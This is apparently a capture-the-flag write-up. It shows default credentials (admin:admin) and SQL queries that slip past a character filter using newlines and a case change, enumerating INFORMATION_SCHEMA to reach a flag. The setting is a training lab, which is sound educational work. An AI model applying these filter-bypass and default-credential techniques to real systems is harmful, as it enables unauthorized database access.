Write-up:

1. Logging in as `admin:admin` works. We are shown a textbox to enter a SQL query.

2. After some attempts at different queries, we find the following rules:
   1. Query must start with SELECT
   2. Can't use whitespaces
   3. Can't use ';'
   4. Can't use '/'
   5. Can't use '()'
   6. Can't use '`'
   7. Can't use '='
   8. Can't use '*'
   9. Can't use single quotes
   
3. After some attemps, the following query works: 

    ```sql
    SELECT
    SCHEMA_NAME
    FROM
    INFORMATION_SCHEMA.SCHEMATA
    ```

4. The following query finds us an interesting table called `f14gs_w9391a83478972077a56e38cb8edaeb83652365a6`

    ```sql
    SELECT
    TABLE_SCHEMA,TABLE_NAME
    FROM
    INFORMATION_SCHEMA.TABLES
    ```

5. The following query reveals the only column in the relevant table: `flag_69bce679dc88f`

    ```sql
    SELECT
    TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME
    FROM
    INFORMATION_SCHEMA.COLUMNS
    ```

6. The following query shows us we can't use the word flag:

    ```sql
    SELECT
    flag_69bce679dc88f
    FROM
    test.f14gs_w9391a83478972077a56e38cb8edaeb83652365a6
    ```

    To work around this, we use capital letters:

    ```sql
    SELECT
    FLAG_69bce679dc88f
    FROM
    test.f14gs_w9391a83478972077a56e38cb8edaeb83652365a6
    ```

    This shows us the flag: `CRHC{7u3t_l3t_u_f4mi1i@r_w17h_3ql_3yn7ax}`
